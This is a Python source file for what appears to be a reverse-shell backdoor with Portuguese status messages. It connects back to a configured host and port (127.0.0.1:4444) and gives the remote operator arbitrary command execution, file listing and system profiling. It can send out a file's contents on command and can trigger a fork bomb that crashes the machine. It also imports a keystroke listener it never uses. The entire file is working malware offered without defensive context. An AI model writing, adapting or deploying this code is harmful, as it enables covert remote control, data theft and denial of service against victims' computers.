
import socket
import subprocess
import os
import platform
import getpass
import colorama
from colorama import Fore, Style
from time import sleep
from pynput.keyboard import Listener
import re

colorama.init()

RHOST = "127.0.0.1"
RPORT = 4444

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

def main():
    while True:
        try:
            header = f"""{Fore.RED}{getpass.getuser()}@{platform.node()}{Style.RESET_ALL}:{Fore.LIGHTBLUE_EX}{os.getcwd()}{Style.RESET_ALL}$ """
            sock.send(header.encode())
            STDOUT, STDERR = None, None
            cmd = sock.recv(1024).decode("utf-8")

            
            if cmd == "list":
                sock.send(str(os.listdir(".")).encode())

            
            if cmd == "forkbomb":
                while True:
                    os.fork()

            
            elif cmd.split(" ")[0] == "cd":
                os.chdir(cmd.split(" ")[1])
                sock.send("[+] diretorio para ==> {}".format(os.getcwd()).encode())

            
            elif cmd == "sysinfo":
                sysinfo = f"""
    Operating System: {platform.system()}
    Computer Name: {platform.node()}
    Username: {getpass.getuser()}
    Release Version: {platform.release()}
    Processor Architecture: {platform.processor()}
                """
                sock.send(sysinfo.encode())

            
            elif cmd.split(" ")[0] == "download":
                with open(cmd.split(" ")[1], "rb") as f:
                    file_data = f.read(1024)
                    while file_data:
                        print("[+] enviando...", file_data)
                        sock.send(file_data)
                        file_data = f.read(1024)
                    sleep(2)
                    sock.send(b"DONE")

            
            elif cmd == "exit":
                sock.send(b"exit")
                break
               
            else:
                comm = subprocess.Popen(str(cmd), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                STDOUT, STDERR = comm.communicate()
                if not STDOUT:
                    sock.send(STDERR)
                else:
                    sock.send(STDOUT)

            
            if not cmd:
                break
        except Exception as e:
            sock.send("[+] um erro foi registrado: {}".format(str(e)).encode())
    sock.close()


while True:
    try:
        sleep(1)
        sock.connect((RHOST, RPORT))
        main()
    except:
        continue



